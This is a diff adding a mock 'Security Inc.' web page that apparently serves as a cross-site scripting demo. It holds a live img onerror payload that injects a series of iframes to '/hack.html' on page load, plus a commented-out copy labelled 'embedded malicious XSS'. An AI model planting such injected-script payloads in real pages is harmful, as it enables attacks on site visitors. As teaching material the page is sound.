@@ -1,0 +1,71 @@
+<html>
+
+<head>
+    <link rel='stylesheet' href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" />
+</head>
+
+<body>
+    <nav class="navbar navbar-inverse navbar-fixed-top">
+        <div class="container">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="#">Security Inc.</a>
+            </div>
+            <div id="navbar" class="collapse navbar-collapse">
+                <ul class="nav navbar-nav">
+                    <li class="active"><a href="#">Home</a></li>
+                    <li><a href="#about">About</a></li>
+                    <li><a href="#contact">Contact</a></li>
+                </ul>
+            </div>
+            <!--/.nav-collapse -->
+        </div>
+    </nav>
+
+    <div class="container">
+
+        <div class="starter-template" style='margin-top:80px;'>
+            <h1>Super Secure Site!!!!</h1>
+            <p class="lead">We have never been hacked!<br> <em>You can trust us!</em></p>
+            <img src=x onerror="var i=0,a=setInterval(()=>{++i>=20&&clearInterval(a);var e=document.createElement('iframe');e.src='/hack.html?p='+i,document.getElementById('content').appendChild(e)},400);">
+        </div>
+        <div id="content"></div>
+    </div>
+    <!-- /.container -->
+
+
+    <!-- Bootstrap core JavaScript
+  ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <script>
+        window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')
+    </script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <!--
+    <script>
+        // embedded malicious XSS
+        (function() {
+            console.log("Let the fun begin.");
+            let id = 0;
+            const attack = setInterval(function() {
+                if (++id > 20) {
+                    clearInterval(attack);
+                    return;
+                }
+                console.log('request:', id);
+                const hack = document.createElement("iframe");
+                hack.src = '/hack.html?p=' + id;
+                document.getElementById("content").appendChild(hack);
+            }, 400);
+        });
+    </script>
+  -->
+</body>
+
+</html>
